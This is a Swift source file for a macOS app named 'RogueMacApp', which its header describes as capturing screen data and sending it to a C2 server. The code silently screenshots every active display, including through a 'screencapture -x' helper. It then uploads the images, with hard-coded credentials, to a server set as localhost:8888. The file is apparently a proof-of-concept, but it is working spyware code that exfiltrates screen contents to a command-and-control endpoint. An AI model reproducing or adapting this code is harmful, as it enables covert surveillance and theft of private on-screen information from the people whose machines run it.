//
//  ViewController.swift
//  RogueMacApp - capture screen data and send it to the C2 Server to analyze
//
//  Created by MalwareSec on 2/11/18.
//  Copyright © 2018 MalwareSec. All rights reserved.
//

import Cocoa
import AppKit
import Alamofire
import SwiftyJSON

class ViewController: NSViewController {

    @IBOutlet weak var TitleLabel: NSTextField!
    @IBOutlet weak var DescriptionLabel: NSTextField!
    @IBOutlet weak var SentLabel: NSTextField!
    var image: NSImage?
    
    
    override func viewDidLoad() {
        super.viewDidLoad()
        SentLabel.isHidden = true
        // Do any additional setup after loading the view.
    }

    override var representedObject: Any? {
        didSet {
        // Update the view, if already loaded.
        }
    }
    
    func CreateTimeStamp() -> Int32 {
        return Int32(Date().timeIntervalSince1970)
    }
    
    //Capturing Screen Data
    //Takes picture at /Users/<user>/Library/Developer/Xcode/DerivedData/RogueMacApp-flbupyvamnkifictrjhmlalwblma/Build/Products/Debug/
    //Adaptation of this: https://stackoverflow.com/questions/39691106/programatically-screenshot-swift-3-macos
    func TakeScreenShots(folderName: String) -> (URL) {
        let fileUrl = URL(string: "https://www.apple.com")
        var displayCount: UInt32 = 0;
        var result = CGGetActiveDisplayList(0, nil, &displayCount)
        if (result != CGError.success) {
            print("error: \(result)")
        }
        let allocated = Int(displayCount)
        let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
        result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
            
        if (result != CGError.success) {
            print("error: \(result)")
        }
            
        for i in 1...displayCount {
            let unixTimestamp = CreateTimeStamp()
            let fileUrl = URL(fileURLWithPath: folderName + "\(unixTimestamp)" + "_" + "\(i)" + ".jpg", isDirectory: true)
            let screenShot:CGImage = CGDisplayCreateImage(activeDisplays[Int(i-1)])!
            let bitmapRep = NSBitmapImageRep(cgImage: screenShot)
            let jpegData = bitmapRep.representation(using: NSBitmapImageRep.FileType.jpeg, properties: [:])!
                
                
            do {
                try jpegData.write(to: fileUrl, options: .atomic)
                return fileUrl
            }
            catch {print("error: \(error)")
            }
        }
        return fileUrl!
    }
    
    func uploadImage() {
        
        let filepath = TakeScreenShots(folderName: "")
        
        // User "authentication":
        let parameters = ["user":"User", "password":"secret1234"]
        
        // Server address
        let url = "http://localhost:8888/index.php"
        
        // Use Alamofire to upload the image
        Alamofire.upload(
            multipartFormData: { multipartFormData in
                // On the PHP side you can retrive the image using $_FILES["image"]["tmp_name"]
                multipartFormData.append(filepath, withName: "image")
                for (key, val) in parameters {
                    multipartFormData.append(val.data(using: String.Encoding.utf8)!, withName: key)
            }
        },
            to: url,
            encodingCompletion: { encodingResult in
                switch encodingResult {
                case .success(let upload, _, _):
                    upload.responseJSON { response in
                        if let jsonResponse = response.result.value as? [String: Any] {
                            print(jsonResponse)
                        }
                    }
                case .failure(let encodingError):
                    print(encodingError)
                }
        }
        )

    }
 
    
    //Simple but ineffective screenshot function
    func take_test() {
        let task = Process()
        task.launchPath = "/usr/sbin/screencapture"
        task.arguments = ["image.jpg", "-x"] //image name, silent
        task.launch()
    }
    
    //Simple get request function using Alamofire
    func simpleRequest() {
        Alamofire.request("https://httpbin.org/get").responseJSON { response in
            print("Request: \(String(describing: response.request))")   // original url request
            print("Response: \(String(describing: response.response))") // http url response
            print("Result: \(response.result)")                         // response serialization result
            
            if let json = response.result.value {
                print("JSON: \(json)") // serialized json response
            }
            
            if let data = response.data, let utf8Text = String(data: data, encoding: .utf8) {
                print("Data: \(utf8Text)") // original server data as UTF8 string
            }
        }
    }

    @IBAction func SimpleScreenShot(_ sender: Any) {
        uploadImage()
        SentLabel.isHidden = false
    }
    
    

}

